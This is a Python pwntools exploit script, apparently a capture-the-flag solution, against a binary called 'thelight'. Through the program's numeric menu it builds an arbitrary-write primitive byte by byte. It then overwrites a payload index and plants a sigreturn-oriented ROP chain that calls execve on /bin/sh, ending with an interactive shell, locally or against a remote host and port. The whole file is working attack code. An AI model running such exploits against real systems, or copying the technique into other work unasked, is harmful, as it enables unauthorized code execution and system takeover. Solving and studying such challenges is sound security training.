#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('thelight')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *listPanels+398
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io, set_val, set_one, set_two, set_five, set_ten, zero_reg

    io = start()
    set_val = lambda: io.sendlineafter(b"(1-8)", b"5")
    set_one = lambda: io.sendlineafter(b"(1-8)", b"1")
    set_two = lambda: io.sendlineafter(b"(1-8)", b"2")
    set_five = lambda: io.sendlineafter(b"(1-8)", b"3")
    set_ten = lambda: io.sendlineafter(b"(1-8)", b"4")
    zero_reg = lambda: io.sendlineafter(b"(1-8)", b"6")


def write_byte(value):
    zero_reg()

    tens = value // 10
    remainder = value % 10
    fives = remainder // 5
    ones = remainder % 5
    
    for _ in range(tens):
        set_ten()
        
    for _ in range(fives):
        set_five()
    
    for _ in range(ones):
        set_one()
    
    set_val()


def arb_write(data):

    for byte in data:
        write_byte(byte)
        zero_reg()


def do_rop():

    pop_rdi = 0x401438
    atoi_plt = exe.plt["atoi"]
    sh = next(exe.search(b"/bin/sh\x00"))
    syscall = 0x401426 # syscall; 
    sig_return = 0x40141f # mov rax, 0xf; syscall; 

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall

    arb_write(p64(sig_return))
    arb_write(bytes(frame))


def solve():

    # trigger arb write
    for _ in range(4):
        io.sendlineafter(b"(y/n)", b"y")

    set_one() # so that when we overwrite the loop variable we set it to 1

    # set payloadIndex to right value (offset 0x50)
    for _ in range(0x50):
        set_val()
    
    do_rop()

    # trigger rop chain
    io.sendlineafter(b"(1-8)", b"7")
    io.clean()
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
